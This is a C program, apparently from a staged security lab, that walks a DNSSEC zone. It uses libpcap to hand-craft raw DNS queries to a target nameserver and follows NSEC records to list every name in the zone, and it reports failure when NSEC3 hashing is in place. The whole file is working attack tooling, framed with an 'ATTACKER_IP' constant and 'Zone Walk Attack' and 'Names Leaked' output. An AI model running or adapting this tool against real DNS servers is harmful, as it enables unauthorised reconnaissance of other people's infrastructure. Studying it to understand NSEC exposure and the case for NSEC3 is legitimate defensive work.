#define _GNU_SOURCE
#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <net/if.h>
#include <pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define IFACE "eth0"
#define ATTACKER_IP "172.16.2.100"
#define DEFAULT_TARGET_IP "172.16.2.10"
#define ZONE_APEX "example.com"
#define MAX_NAMES 64

struct pseudo_header {
    uint32_t src;
    uint32_t dst;
    uint8_t zero;
    uint8_t protocol;
    uint16_t udp_length;
};

static uint16_t ip_checksum(const void *data, size_t len){
    const uint8_t *p = data;
    uint32_t sum = 0;

    while (len > 1) {
        sum += ((uint16_t)p[0] << 8) | p[1];
        p += 2;
        len -= 2;
    }

    if (len)
        sum += (uint16_t)p[0] << 8;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return htons((uint16_t)(~sum));
}

static uint16_t udp_checksum_ipv4(const struct iphdr *ip, const struct udphdr *udp, size_t udp_len){
    struct pseudo_header ph;
    ph.src = ip->saddr;
    ph.dst = ip->daddr;
    ph.zero = 0;
    ph.protocol = IPPROTO_UDP;
    ph.udp_length = htons((uint16_t)udp_len);

    uint32_t sum = 0;
    const uint8_t *p = (const uint8_t *)&ph;
    for (size_t i = 0; i < sizeof(ph); i += 2)
        sum += ((uint16_t)p[i] << 8) | p[i + 1];

    p = (const uint8_t *)udp;
    size_t len = udp_len;
    while (len > 1) {
        sum += ((uint16_t)p[0] << 8) | p[1];
        p += 2;
        len -= 2;
    }
    if (len)
        sum += (uint16_t)p[0] << 8;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    uint16_t res = (uint16_t)(~sum);
    return res ? htons(res) : 0xffff;
}

static int get_interface_mac(const char *iface, uint8_t mac[6]){
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return -1;

    struct ifreq req;
    memset(&req, 0, sizeof(req));
    strncpy(req.ifr_name, iface, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &req) < 0) {
        close(fd);
        return -1;
    }

    memcpy(mac, req.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 0;
}

static int resolve_ip_mac(const char *target_ip, const char *iface, uint8_t mac[6]){
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "ping -c 1 -W 1 %s >/dev/null 2>&1", target_ip);

    for (int attempt = 0; attempt < 5; attempt++) {
        (void)system(cmd);

        FILE *f = fopen("/proc/net/arp", "r");
        if (f) {
            char line[256];
            (void)fgets(line, sizeof(line), f);

            while (fgets(line, sizeof(line), f)) {
                char ip[32], hw[32], dev[32];
                unsigned int flags = 0;

                if (sscanf(line, "%31s %*s %x %31s %*s %31s",
                           ip, &flags, hw, dev) == 4 &&
                    strcmp(ip, target_ip) == 0 &&
                    (flags & 0x2) &&
                    strcmp(dev, iface) == 0) {

                    unsigned int b[6];
                    if (sscanf(hw, "%x:%x:%x:%x:%x:%x",
                               &b[0], &b[1], &b[2],
                               &b[3], &b[4], &b[5]) == 6) {
                        for (int i = 0; i < 6; i++)
                            mac[i] = (uint8_t)b[i];

                        fclose(f);
                        return 0;
                    }
                }
            }
            fclose(f);
        }
        usleep(300000);
    }
    return -1;
}

static int encode_dns_name(const char *src, uint8_t *dst, size_t max_len){
    size_t out_idx = 0;
    const char *start = src;

    while (*start) {
        const char *end = strchr(start, '.');
        size_t len = end ? (size_t)(end - start) : strlen(start);

        if (len == 0 || len > 63 || out_idx + 1 + len >= max_len)
            return -1;

        dst[out_idx++] = (uint8_t)len;
        for (size_t i = 0; i < len; i++)
            dst[out_idx++] = tolower((unsigned char)start[i]);

        if (!end)
            break;
        start = end + 1;
    }

    if (out_idx >= max_len)
        return -1;
    dst[out_idx++] = 0x00;
    return (int)out_idx;
}

static int skip_dns_name(const uint8_t *msg, size_t len, size_t *offset){
    size_t p = *offset;

    while (p < len) {
        uint8_t n = msg[p];

        if ((n & 0xc0) == 0xc0) {
            if (p + 1 >= len)
                return -1;
            *offset = p + 2;
            return 0;
        }

        if (n & 0xc0)
            return -1;

        p++;
        if (n == 0) {
            *offset = p;
            return 0;
        }

        if (p + n > len)
            return -1;

        p += n;
    }

    return -1;
}

static int decode_dns_name(const uint8_t *msg, size_t len, size_t *offset, char *out, size_t out_size){
    size_t p = *offset, consumed = 0, used = 0;
    int jumped = 0;
    unsigned int hops = 0;

    while (p < len && hops++ < 128) {
        uint8_t n = msg[p];

        if ((n & 0xc0) == 0xc0) {
            if (p + 1 >= len)
                return -1;

            size_t ptr = ((size_t)(n & 0x3f) << 8) | msg[p + 1];
            if (ptr >= len)
                return -1;

            if (!jumped)
                consumed += 2;

            p = ptr;
            jumped = 1;
            continue;
        }

        if (n & 0xc0)
            return -1;

        p++;
        if (!jumped)
            consumed++;

        if (n == 0)
            break;

        if (p + n > len)
            return -1;

        if (used && used + 1 < out_size)
            out[used++] = '.';

        if (used + n >= out_size)
            return -1;

        for (size_t i = 0; i < n; i++)
            out[used++] = tolower((unsigned char)msg[p + i]);

        p += n;
        if (!jumped)
            consumed += n;
    }

    if (used < out_size)
        out[used] = '\0';
    else
        return -1;

    if (!jumped)
        *offset = p;
    else
        *offset += consumed;

    return 0;
}

/*
 * Decode uncompressed Next Domain Name from NSEC RDATA (RFC 4034 Section 4.1.1)
 */
static int decode_nsec_next(const uint8_t *rdata, size_t rdata_len, char *out, size_t out_size) {
    size_t p = 0, used = 0;

    while (p < rdata_len) {
        uint8_t n = rdata[p++];
        if (n == 0)
            break;
        if ((n & 0xc0) != 0 || p + n > rdata_len)
            return -1;

        if (used && used + 1 < out_size)
            out[used++] = '.';

        if (used + n >= out_size)
            return -1;

        for (size_t i = 0; i < n; i++)
            out[used++] = tolower((unsigned char)rdata[p + i]);
        p += n;
    }

    if (used < out_size)
        out[used] = '\0';
    else
        return -1;

    return 0;
}

/*
 * Convert binary hash to Base32hex representation for NSEC3
 */
static void base32hex_encode(const uint8_t *data, size_t len, char *out) {
    static const char b32[] = "0123456789abcdefghijklmnopqrstuv";
    size_t out_idx = 0;
    uint32_t buffer = 0;
    int bits_left = 0;

    for (size_t i = 0; i < len; i++) {
        buffer = (buffer << 8) | data[i];
        bits_left += 8;
        while (bits_left >= 5) {
            bits_left -= 5;
            out[out_idx++] = b32[(buffer >> bits_left) & 0x1f];
        }
    }
    if (bits_left > 0) {
        buffer <<= (5 - bits_left);
        out[out_idx++] = b32[buffer & 0x1f];
    }
    out[out_idx] = '\0';
}

static size_t build_dns_query(const char *qname, uint16_t qtype, uint16_t txid, uint8_t *buf, size_t max_buf) {
    if (max_buf < 512)
        return 0;

    memset(buf, 0, 12);
    buf[0] = (txid >> 8) & 0xff;
    buf[1] = txid & 0xff;
    buf[2] = 0x01; // RD=1
    buf[3] = 0x00; // No AD claim in the query
    buf[4] = 0x00; // QDCOUNT=1
    buf[5] = 0x01;
    buf[6] = 0x00; // ANCOUNT=0
    buf[7] = 0x00;
    buf[8] = 0x00; // NSCOUNT=0
    buf[9] = 0x00;
    buf[10] = 0x00; // ARCOUNT=1 (EDNS0)
    buf[11] = 0x01;

    size_t off = 12;
    int nlen = encode_dns_name(qname, buf + off, max_buf - off);
    if (nlen < 0)
        return 0;
    off += (size_t)nlen;

    buf[off++] = (qtype >> 8) & 0xff;
    buf[off++] = qtype & 0xff;
    buf[off++] = 0x00; // CLASS IN
    buf[off++] = 0x01;

    /* OPT Pseudo-RR (EDNS0) with DO (DNSSEC OK) bit = 1 */
    buf[off++] = 0x00; // Root name
    buf[off++] = 0x00; // TYPE OPT (41)
    buf[off++] = 0x29;
    buf[off++] = 0x04; // UDP payload size = 1232
    buf[off++] = 0xd0;
    buf[off++] = 0x00; // Extended RCODE
    buf[off++] = 0x00; // EDNS Version
    buf[off++] = 0x80; // DO bit set (0x8000)
    buf[off++] = 0x00;
    buf[off++] = 0x00; // RDLENGTH = 0
    buf[off++] = 0x00;

    return off;
}

static int send_and_recv_dns(pcap_t *handle, const uint8_t *src_mac, const uint8_t *dst_mac, const char *src_ip_str, const char *dst_ip_str, uint16_t src_port, uint16_t dst_port, const char *qname, uint16_t qtype, uint16_t txid, uint8_t *resp_dns, size_t *resp_dns_len, size_t max_resp) {
    uint8_t dns_query[512];
    size_t query_len = build_dns_query(qname, qtype, txid, dns_query, sizeof(dns_query));
    if (query_len == 0)
        return -1;

    uint8_t frame[1024];
    struct ethhdr *eth = (struct ethhdr *)frame;
    memcpy(eth->h_source, src_mac, 6);
    memcpy(eth->h_dest, dst_mac, 6);
    eth->h_proto = htons(ETH_P_IP);

    struct iphdr *ip = (struct iphdr *)(frame + sizeof(struct ethhdr));
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    size_t ip_len = sizeof(struct iphdr);
    size_t udp_len = sizeof(struct udphdr) + query_len;
    ip->tot_len = htons((uint16_t)(ip_len + udp_len));
    ip->id = htons((uint16_t)(rand() & 0xffff));
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    inet_pton(AF_INET, src_ip_str, &ip->saddr);
    inet_pton(AF_INET, dst_ip_str, &ip->daddr);
    ip->check = 0;
    ip->check = ip_checksum(ip, ip_len);

    struct udphdr *udp = (struct udphdr *)(frame + sizeof(struct ethhdr) + ip_len);
    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons((uint16_t)udp_len);
    udp->check = 0;
    memcpy((uint8_t *)udp + sizeof(struct udphdr), dns_query, query_len);
    udp->check = udp_checksum_ipv4(ip, udp, udp_len);

    size_t frame_len = sizeof(struct ethhdr) + ip_len + udp_len;

    for (int retry = 0; retry < 3; retry++) {
        if (pcap_inject(handle, frame, frame_len) < 0) {
            fprintf(stderr, "pcap_inject failed: %s\n", pcap_geterr(handle));
            return -1;
        }

        struct pcap_pkthdr *hdr;
        const uint8_t *pkt_data;

        for (int ms = 0; ms < 2000; ms++) {
            int res = pcap_next_ex(handle, &hdr, &pkt_data);
            if (res > 0) {
                if (hdr->caplen < sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr))
                    continue;

                struct iphdr *r_ip = (struct iphdr *)(pkt_data + sizeof(struct ethhdr));
                if (r_ip->protocol != IPPROTO_UDP)
                    continue;

                size_t r_ip_len = (size_t)r_ip->ihl * 4;
                struct udphdr *r_udp = (struct udphdr *)(pkt_data + sizeof(struct ethhdr) + r_ip_len);

                if (ntohs(r_udp->dest) != src_port)
                    continue;

                const uint8_t *r_dns = pkt_data + sizeof(struct ethhdr) + r_ip_len + sizeof(struct udphdr);
                size_t r_dns_len = ntohs(r_udp->len) - sizeof(struct udphdr);

                if (r_dns_len < 12)
                    continue;

                uint16_t r_txid = ((uint16_t)r_dns[0] << 8) | r_dns[1];
                if (r_txid != txid)
                    continue;

                if (r_dns_len > max_resp)
                    r_dns_len = max_resp;

                memcpy(resp_dns, r_dns, r_dns_len);
                *resp_dns_len = r_dns_len;
                return 0;
            }
            usleep(1000); // Sleep 1ms
        }
    }
    return -1;
}

/*
 * Parse NSEC or NSEC3 from DNS response:
 * Returns:
 *   1 if NSEC found, sets next_domain_out and owner_out
 *   2 if NSEC3 found, sets nsec3_hash_out and salt_out
 *   0 if neither found
 */
static int parse_denial_proof(const uint8_t *dns, size_t len, char *owner_out, size_t owner_size, char *next_domain_out, size_t next_domain_size, char *nsec3_hash_out, size_t nsec3_hash_size) {
    if (len < 12)
        return 0;

    uint16_t qdcount = ((uint16_t)dns[4] << 8) | dns[5];
    uint16_t ancount = ((uint16_t)dns[6] << 8) | dns[7];
    uint16_t nscount = ((uint16_t)dns[8] << 8) | dns[9];

    size_t off = 12;

    /* Skip Question section */
    for (uint16_t i = 0; i < qdcount; i++) {
        if (skip_dns_name(dns, len, &off) < 0 || off + 4 > len)
            return 0;
        off += 4;
    }

    /* Check Answer then Authority sections */
    uint16_t total_rrs = ancount + nscount;
    for (uint16_t i = 0; i < total_rrs; i++) {
        char rr_name[256];
        if (decode_dns_name(dns, len, &off, rr_name, sizeof(rr_name)) < 0 || off + 10 > len)
            return 0;

        uint16_t type = ((uint16_t)dns[off] << 8) | dns[off + 1];
        uint16_t rdlen = ((uint16_t)dns[off + 8] << 8) | dns[off + 9];
        off += 10;
        if (off + rdlen > len)
            return 0;

        const uint8_t *rdata = dns + off;
        off += rdlen;

        if (type == 47) { // NSEC
            snprintf(owner_out, owner_size, "%s", rr_name);

            if (decode_nsec_next(rdata, rdlen, next_domain_out, next_domain_size) == 0)
                return 1;
        } else if (type == 50) { // NSEC3
            if (rdlen < 6)
                continue;
            uint8_t salt_len = rdata[4];
            if (5 + salt_len >= rdlen)
                continue;
            uint8_t hash_len = rdata[5 + salt_len];
            if (6 + salt_len + hash_len > rdlen)
                continue;

            const uint8_t *hash_bytes = rdata + 6 + salt_len;
            char b32[64];
            base32hex_encode(hash_bytes, hash_len, b32);
            snprintf(nsec3_hash_out, nsec3_hash_size, "%s", b32);
            return 2;
        }
    }

    return 0;
}

int main(int argc, char **argv)
{
    setlinebuf(stdout);
    const char *target_ip = (argc > 1) ? argv[1] : DEFAULT_TARGET_IP;
    char zone_apex_storage[256];
    snprintf(zone_apex_storage, sizeof(zone_apex_storage), "%s",
             (argc > 2) ? argv[2] : ZONE_APEX);
    size_t zone_apex_len = strlen(zone_apex_storage);
    if (zone_apex_len > 0 && zone_apex_storage[zone_apex_len - 1] == '.')
        zone_apex_storage[zone_apex_len - 1] = '\0';
    const char *zone_apex = zone_apex_storage;

    srand(time(NULL) ^ getpid());

    printf("======================================================================\n");
    printf("                PHASE 5: DNSSEC ZONE WALKER (C / libpcap)             \n");
    printf("======================================================================\n");
    printf("Target DNS Server: %s\n", target_ip);
    printf("Target Zone Apex:  %s\n", zone_apex);
    printf("Interface:         %s\n", IFACE);
    printf("Attacker IP:       %s\n\n", ATTACKER_IP);

    uint8_t src_mac[6], dst_mac[6];
    if (get_interface_mac(IFACE, src_mac) < 0) {
        fprintf(stderr, "[-] Failed to get MAC for %s\n", IFACE);
        return 1;
    }

    printf("[+] Resolving MAC address for target %s...\n", target_ip);
    if (resolve_ip_mac(target_ip, IFACE, dst_mac) < 0) {
        fprintf(stderr, "[-] Failed to resolve MAC for %s\n", target_ip);
        return 1;
    }

    printf("[+] Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5]);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(IFACE, 65535, 1, 10, errbuf);
    if (!handle) {
        fprintf(stderr, "[-] pcap_open_live failed: %s\n", errbuf);
        return 1;
    }

    if (pcap_setnonblock(handle, 1, errbuf) < 0) {
        fprintf(stderr, "[-] pcap_setnonblock failed: %s\n", errbuf);
    }

    uint16_t src_port = 45000 + (rand() % 10000);

    /* Bind dummy UDP socket to src_port so kernel does not send ICMP port unreachable */
    int dummy_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (dummy_sock >= 0) {
        struct sockaddr_in sin;
        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port = htons(src_port);
        sin.sin_addr.s_addr = INADDR_ANY;
        bind(dummy_sock, (struct sockaddr *)&sin, sizeof(sin));
    }

    char filter_exp[128];
    snprintf(filter_exp, sizeof(filter_exp),
             "udp and src host %s and src port 53 and dst port %u",
             target_ip, src_port);

    struct bpf_program fp;
    if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(handle, &fp) < 0) {
        fprintf(stderr, "[-] Failed to set BPF filter: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        return 1;
    }

    printf("[+] BPF filter active: %s\n\n", filter_exp);
    printf("--- Beginning Zone Walk Attack ---\n");

    char current_name[256];
    strncpy(current_name, zone_apex, sizeof(current_name) - 1);

    char discovered_names[MAX_NAMES][256];
    size_t num_discovered = 0;

    /* Add apex as first discovered name */
    strncpy(discovered_names[num_discovered++], zone_apex, 255);

    int query_count = 0;
    int is_nsec3 = 0;
    int walk_complete = 0;

    while (num_discovered < MAX_NAMES) {
        query_count++;
        uint16_t txid = (uint16_t)(rand() & 0xffff);

        /*
         * Query for a non-existent record type (TXT) on the current name.
         * The signed nameserver returns NODATA (NOERROR) with the authoritative
         * NSEC record whose Next Domain Name points directly to the next name.
         */
        uint8_t resp_dns[2048];
        size_t resp_dns_len = 0;

        if (send_and_recv_dns(handle, src_mac, dst_mac, ATTACKER_IP, target_ip,
                              src_port, 53, current_name, 16, txid,
                              resp_dns, &resp_dns_len, sizeof(resp_dns)) < 0) {
            fprintf(stderr, "[-] Timeout waiting for response to query '%s'\n", current_name);
            break;
        }

        char owner[256] = {0};
        char next_name[256] = {0};
        char nsec3_hash[256] = {0};

        int proof = parse_denial_proof(resp_dns, resp_dns_len, owner, sizeof(owner),
                                       next_name, sizeof(next_name),
                                       nsec3_hash, sizeof(nsec3_hash));

        if (proof == 2) {
            printf("[!] NSEC3 DETECTED: Query #%d on '%s' returned NSEC3 denial proof.\n",
                   query_count, current_name);
            printf("    Next Hashed Owner: %s\n", nsec3_hash);
            printf("[-] [BLOCKED] The zone is protected by RFC 5155 NSEC3!\n");
            printf("    Plaintext domain names are hashed; zone walking cannot recover names.\n");
            is_nsec3 = 1;
            break;
        } else if (proof == 1) {
            printf("[+] Query #%2d: [%-22s] -> NSEC next: [%-22s]\n",
                   query_count, current_name, next_name);

            /* Check if we completed the cycle */
            if (strcasecmp(next_name, zone_apex) == 0) {
                printf("\n[+] Full circle completed! Next name wrapped back to apex '%s'.\n", zone_apex);
                walk_complete = 1;
                break;
            }

            /* Record the newly discovered name */
            int already_seen = 0;
            for (size_t i = 0; i < num_discovered; i++) {
                if (strcasecmp(discovered_names[i], next_name) == 0) {
                    already_seen = 1;
                    break;
                }
            }

            if (!already_seen) {
                snprintf(discovered_names[num_discovered++],
                         sizeof(discovered_names[0]), "%s", next_name);
            }

            snprintf(current_name, sizeof(current_name), "%s", next_name);
        } else {
            fprintf(stderr, "[-] No NSEC or NSEC3 record found in response for '%s'\n", current_name);
            break;
        }
    }

    printf("\n======================================================================\n");
    printf("                     ZONE WALK ATTACK SUMMARY                         \n");
    printf("======================================================================\n");

    if (is_nsec3) {
        printf("Result:         FAILURE (Zone Protected by NSEC3)\n");
        printf("Queries Sent:   %d\n", query_count);
        printf("Names Leaked:   0 (Protected against cleartext walking)\n");
    } else if (!walk_complete) {
        printf("Result:         FAILURE (Zone Walk Did Not Complete)\n");
        printf("Queries Sent:   %d\n", query_count);
        printf("Names Leaked:   0 (No complete walk)\n");
    } else {
        printf("Result:         SUCCESS (Zone Walk Complete via NSEC)\n");
        printf("Total Queries:  %d (Efficiency constraint <= %zu+2 queries satisfied)\n",
               query_count, num_discovered);
        printf("Names Found:    %zu\n\n", num_discovered);

        printf("%-4s  %-28s\n", "No.", "Domain Name");
        printf("------------------------------------------\n");

        for (size_t i = 0; i < num_discovered; i++) {
            printf("%-4zu  %-28s\n", i + 1, discovered_names[i]);
        }
    }

    printf("======================================================================\n");
    pcap_close(handle);
    return is_nsec3 ? 1 : 0;
}
